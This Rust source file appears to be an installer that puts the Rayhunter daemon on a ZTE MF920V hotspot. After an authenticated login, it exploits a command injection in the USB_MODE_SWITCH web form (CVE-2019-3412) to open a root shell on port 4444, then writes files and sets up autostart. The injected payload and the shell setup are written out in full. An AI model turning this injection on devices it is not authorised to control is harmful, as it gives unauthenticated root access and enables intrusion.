/// Installer for the ZTE MF920V (Vodafone R218) hotspot.
use std::net::SocketAddr;
use std::str::FromStr;
use std::time::Duration;

use anyhow::{Context, Result, bail};
use base64_light::base64_encode_bytes;
use reqwest::Client;
use serde::Deserialize;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::time::sleep;

use crate::ZteArgs as Args;
use crate::connection::{DeviceConnection, install_config};
use crate::output::{print, println};
use crate::util::{interactive_shell, telnet_send_command, wait_for_telnet};

const SHELL_PORT: u16 = 4444;
const FILE_TRANSFER_PORT: u16 = 9999;

#[derive(Deserialize)]
struct LoginResponse {
    result: String,
}

/// ZTE connection wrapper implementing DeviceConnection trait
struct ZteConnection {
    addr: SocketAddr,
}

impl ZteConnection {
    fn new(addr: SocketAddr) -> Self {
        Self { addr }
    }
}

impl DeviceConnection for ZteConnection {
    async fn run_command(&mut self, command: &str) -> Result<String> {
        crate::util::telnet_send_command_with_output(self.addr, command, false).await
    }

    async fn write_file(&mut self, path: &str, content: &[u8]) -> Result<()> {
        tcpsvd_send_file(self.addr, path, content).await
    }
}

/// Login to the ZTE web interface
async fn login(admin_ip: &str, password: &str) -> Result<()> {
    let client = Client::new();

    let endpoint = format!("http://{admin_ip}/goform/goform_set_cmd_process");
    let encoded_password = base64_encode_bytes(password.as_bytes());

    let response: LoginResponse = client
        .post(&endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Referer", format!("http://{admin_ip}/index.html"))
        .body(format!(
            "isTest=false&goformId=LOGIN&password={encoded_password}"
        ))
        .send()
        .await
        .context("Failed to send login request")?
        .error_for_status()
        .context("Error from login request")?
        .json()
        .await
        .context("Error parsing login request as JSON")?;

    if response.result != "0" {
        bail!(
            "Bad login response {}. Maybe the password is wrong?",
            response.result
        );
    }

    // We do not need to return any sort of session cookie. The device has now allowlisted our IP.
    // You can try this yourself: Once you're logged in using the installer, the admin page is
    // reachable from any browser or any incognito window.

    Ok(())
}

/// Start the inetd shell on the device using USB_MODE_SWITCH command injection
async fn start_shell(admin_ip: &str) -> Result<()> {
    let client = Client::new();
    let endpoint = format!("http://{admin_ip}/goform/goform_set_cmd_process");

    // The command injection happens via the USB_MODE_SWITCH goform (CVE-2019-3412)
    // Command: echo '4444 stream tcp nowait root /bin/sh sh' > /tmp/inetd.conf; busybox inetd /tmp/inetd.conf
    // Pre-encoded to avoid needing urlencoding crate
    const ENCODED_CMD: &str = "echo%20%274444%20stream%20tcp%20nowait%20root%20%2Fbin%2Fsh%20sh%27%20%3E%20%2Ftmp%2Finetd.conf%3B%20busybox%20inetd%20%2Ftmp%2Finetd.conf";

    let response = client
        .post(&endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Referer", format!("http://{admin_ip}/index.html"))
        .body(format!(
            "isTest=false&goformId=USB_MODE_SWITCH&usb_mode=6%3b{ENCODED_CMD}%3b"
        ))
        .send()
        .await
        .context("Failed to send shell injection command")?;

    if !response.status().is_success() {
        bail!(
            "Shell injection command failed with status: {}",
            response.status()
        );
    }

    Ok(())
}

/// Send a file to the device using tcpsvd
///
/// Since busybox on ZTE lacks `nc`, we use `tcpsvd` to receive files:
/// 1. Start tcpsvd on the device listening on port 9999
/// 2. Connect from host and send the file data
/// 3. Verify with md5sum
async fn tcpsvd_send_file(addr: SocketAddr, path: &str, content: &[u8]) -> Result<()> {
    print!("Sending file {path} ... ");

    // Kill any existing tcpsvd on the file transfer port from previous transfers
    // tcpsvd will continue running after a file has been sent, as it can handle multiple
    // connections.
    let kill_cmd = format!("pkill -f 'tcpsvd 0 {FILE_TRANSFER_PORT}' 2>/dev/null || true");
    telnet_send_command(addr, &kill_cmd, "exit code 0", false).await?;

    // Start tcpsvd listener on the device in background
    // Wrap in parentheses so the command ends up being (... &);
    // ... &; is invalid
    let tcpsvd_cmd = format!("(busybox tcpsvd 0 {FILE_TRANSFER_PORT} sh -c 'cat>{path}.tmp' &)");

    telnet_send_command(addr, &tcpsvd_cmd, "exit code 0", false).await?;

    // Connect and send file
    let mut file_addr = addr;
    file_addr.set_port(FILE_TRANSFER_PORT);
    let mut attempts = 0;
    let mut stream;

    loop {
        sleep(Duration::from_millis(500 * (1 << attempts))).await;
        stream = TcpStream::connect(file_addr).await;
        attempts += 1;
        if stream.is_ok() || attempts > 5 {
            break;
        }
        print!("attempt {attempts}... ");
    }

    let mut stream = stream.context("Failed to connect to tcpsvd for file transfer")?;
    stream.write_all(content).await?;

    // Wait for data to be written.
    sleep(Duration::from_millis(1000)).await;
    drop(stream);

    // Verify with md5sum
    let checksum = md5::compute(content);

    telnet_send_command(
        addr,
        &format!("md5sum {path}.tmp"),
        &format!("{checksum:x}  {path}.tmp"),
        false,
    )
    .await
    .with_context(|| format!("File transfer failed. Expected checksum: {checksum:x}"))?;

    telnet_send_command(addr, &format!("mv {path}.tmp {path}"), "exit code 0", false).await?;

    println!("ok");
    Ok(())
}

/// Main installation function
pub async fn install(
    Args {
        admin_ip,
        admin_password,
        reset_config,
    }: Args,
) -> Result<()> {
    println!("Installing rayhunter on ZTE MF920V");

    let addr = SocketAddr::from_str(&format!("{admin_ip}:{SHELL_PORT}"))?;

    print!("Logging in to {admin_ip} ... ");
    login(&admin_ip, &admin_password).await?;
    println!("ok");

    print!("Starting shell via USB_MODE_SWITCH exploit ... ");
    start_shell(&admin_ip).await?;
    println!("ok");

    print!("Waiting for shell on port {SHELL_PORT} ... ");
    wait_for_telnet(addr).await?;
    println!("ok");

    print!("Remounting root filesystem read-write ... ");
    telnet_send_command(addr, "mount -o remount,rw /", "exit code 0", false).await?;
    println!("ok");

    print!("Setting up directories ... ");
    // We use the cache directory for rayhunter installation. The idea is that this directory is
    // not important for the ZTE to start up, and if the user fills it with recordings, it may not
    // brick the device. But also the /cache directory is just the biggest partition.
    telnet_send_command(addr, "mkdir -p /cache/rayhunter", "exit code 0", false).await?;
    telnet_send_command(addr, "mkdir -p /data", "exit code 0", false).await?;
    telnet_send_command(addr, "rm -f /data/rayhunter", "exit code 0", false).await?;
    telnet_send_command(
        addr,
        "ln -sf /cache/rayhunter /data/rayhunter",
        "exit code 0",
        false,
    )
    .await?;
    println!("ok");

    let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));
    tcpsvd_send_file(
        addr,
        "/data/rayhunter/rayhunter-daemon",
        rayhunter_daemon_bin,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /data/rayhunter/rayhunter-daemon",
        "exit code 0",
        false,
    )
    .await?;

    let mut conn = ZteConnection::new(addr);
    install_config(
        &mut conn,
        "/data/rayhunter/config.toml",
        "zte",
        reset_config,
    )
    .await?;

    tcpsvd_send_file(
        addr,
        "/etc/init.d/rayhunter_daemon",
        crate::RAYHUNTER_DAEMON_INIT.as_bytes(),
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/rayhunter_daemon",
        "exit code 0",
        false,
    )
    .await?;

    print!("Registering autostart ... ");
    telnet_send_command(
        addr,
        "ln -sf ../init.d/rayhunter_daemon /etc/rc5.d/S99rayhunter_daemon",
        "exit code 0",
        false,
    )
    .await?;
    println!("ok");

    // Step 10: Reboot
    println!(
        "Done. Rebooting device. After it's started up again, check out the web interface at http://{admin_ip}:8080"
    );
    telnet_send_command(addr, "reboot", "exit code 0", false).await?;

    Ok(())
}

/// Open an interactive shell on the ZTE device
pub async fn shell(admin_ip: &str, admin_password: &str) -> Result<()> {
    print!("Logging in to {admin_ip} ... ");
    login(admin_ip, admin_password).await?;
    println!("ok");

    print!("Starting shell via USB_MODE_SWITCH exploit ... ");
    start_shell(admin_ip).await?;
    println!("ok");

    let addr = SocketAddr::from_str(&format!("{admin_ip}:{SHELL_PORT}"))?;
    print!("Waiting for shell on port {SHELL_PORT} ... ");
    wait_for_telnet(addr).await?;
    println!("ok");

    eprintln!(
        "This terminal is fairly limited. The shell prompt may not be visible, but it still accepts commands."
    );

    interactive_shell(admin_ip, SHELL_PORT, false).await
}
